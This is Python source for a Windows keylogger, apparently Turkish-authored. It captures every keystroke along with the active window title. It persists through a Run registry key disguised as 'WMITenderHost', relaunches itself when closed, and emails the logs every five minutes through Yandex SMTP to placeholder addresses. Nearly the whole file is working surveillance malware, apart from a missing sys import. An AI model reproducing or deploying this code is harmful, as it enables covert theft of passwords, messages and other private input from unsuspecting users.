import os
import ctypes
import pynput.keyboard
import smtplib
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
import time
import winreg as reg
import psutil
import subprocess

toplama = ""
current_window = ""
previous_window = ""
user_name = os.getlogin()
log = ""

def add_to_startup(file_path):
    try:
        reg_key = reg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_name = "WMITenderHost"
        reg_value = f'"{file_path}"'

        with reg.OpenKey(reg_key, reg_path, 0, reg.KEY_WRITE) as key:
            reg.SetValueEx(key, reg_name, 0, reg.REG_SZ, reg_value)
        print("Başlangıçta çalışacak şekilde ayarlandı.")
    except Exception as e:
        print(f"Başlangıç ayarları eklenirken hata oluştu: {e}")

def restart_on_close(process_name, file_path):
    while True:
        if not any(proc.name() == process_name for proc in psutil.process_iter()):
            subprocess.Popen(file_path)
        time.sleep(10)

def get_active_window():
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
    buff = ctypes.create_unicode_buffer(length + 1)
    ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
    return buff.value

def komut(harfler):
    global toplama, current_window
    try:
        toplama += str(harfler.char)
    except AttributeError:
        if harfler == harfler.space:
            toplama += " "
        else:
            toplama += str(harfler)
    print(toplama)
    current_window = get_active_window()

def mail_gonderme(mesaj):
    global user_name
    try:
        email_msg = MIMEMultipart()
        email_msg['From'] = "senderemail@email.com" #gonderen 
        email_msg['To'] = "receiveremail@gmail.com" #alan
        email_msg['Subject'] = Header("Server : " + user_name, 'utf-8')

        body = MIMEText(mesaj, 'plain', 'utf-8')
        email_msg.attach(body)

        server = smtplib.SMTP('smtp.yandex.com:587')
        server.ehlo()
        server.starttls()
        server.login("senderemail@email.com", "passwordforemail")
        server.sendmail(email_msg['From'], email_msg['To'], email_msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Email gönderim hatası: {e}")

def check_window_change():
    global current_window, previous_window, toplama, log
    while True:
        current_window = get_active_window()
        if current_window != previous_window:
            if toplama:
                log += f"Aktif Pencere: {previous_window}\nBasilan Tuslar: {toplama}\n\n"
                toplama = ""
            previous_window = current_window
        time.sleep(1)

def send_periodic_email():
    global log
    if log:
        mail_gonderme(log)
        log = ""
    timer = threading.Timer(300, send_periodic_email)
    timer.start()


dinleme = pynput.keyboard.Listener(on_press=komut)


window_thread = threading.Thread(target=check_window_change)
window_thread.daemon = True
window_thread.start()


send_periodic_email()


exe_path = os.path.abspath(sys.argv[0])
add_to_startup(exe_path)


restart_thread = threading.Thread(target=restart_on_close, args=("WMITenderHost.exe", exe_path))
restart_thread.daemon = True
restart_thread.start()

with dinleme:
    dinleme.join()
